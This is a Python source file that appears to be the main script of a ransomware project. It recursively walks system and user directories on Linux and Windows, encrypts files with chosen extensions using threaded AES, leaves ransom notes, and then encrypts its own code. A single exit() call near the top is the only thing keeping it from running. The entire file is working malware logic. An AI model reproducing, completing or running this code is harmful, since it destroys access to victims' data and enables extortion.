import os
import sys

from base64 import encodebytes
from getpass import getpass
from time import time
# from platform import platform  # Replace sys.platform

from src.functions import recursive_walk, parse_array, create_chunks, leave_notes
from src.classes import ThreadedEncrypt, AesExcalibur, Colors
from src.variables import ascii_art, target_extensions, note


# Get the system's OS
if sys.platform in ["linux"]:
    paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "\var", "/opt"  # , "/usr", "/root"

elif sys.platform in ["win32", "win64", "Windows", "windows"]:
    paths = "C:\\ ", "."  # Name of each path to recursively walk


def main():
    """
    Recursively encrypt or decrypt the filesystem
    Ward away the skids with exit()
    """
    os.system("clear" if sys.platform == "linux" else "cls")
    print(Colors.blue + ascii_art)
    exit("THIS WILL HARM YOUR COMPUTER")

    # Get and encode encryption password
    password = getpass(Colors.bold + "Enter a password for the encryption key: ")
    encoded_pass = encodebytes(bytes(password, "utf-8"))

    # Create encryption object
    sanctuary = AesExcalibur(encoded_pass)

    user_input = input(Colors.green + "Encrypt or Decrypt? [e/d] ")
    if user_input in ["e", "E", "enc", "encrypt", "Encrypt"]:

        # Get array of files to infect
        file_array = recursive_walk(paths, target_extensions, 1)

        # Split the array depending on how large it is. If more than 100,000 elements exist, use 10 threads
        chunk_size = parse_array(file_array)

        threads = []
        for chunk in list(create_chunks(file_array, chunk_size)):  # Loop through each chunk in array
            t = ThreadedEncrypt(sanctuary, chunk)  # Create a new thread for each chunk
            threads.append(t)
            t.start()

        # Wait until all threads have joined, then drop notes and encrypt self
        for t in threads:
            t.join()

        leave_notes(note, paths)

        # Encrypt the Excalibur directory
        for root, subdir, files in os.walk(".", topdown=False):
            for file in files:
                sanctuary.encrypt_file(file)
        sanctuary.encrypt_file(os.path.abspath(__file__))  # Encrypt main.py

    # Decryption is not threaded purely for debugging purposes
    elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
        file_array = recursive_walk(paths, target_extensions, 2)
        for file in file_array:
            print(Colors.purple + "Decrypting {}".format(file))
            sanctuary.decrypt_file(file)

    else:
        exit("Invalid input")


if __name__ == '__main__':
    start = time()
    main()
    print(Colors.underline + "Total runtime: {}".format(time() - start))
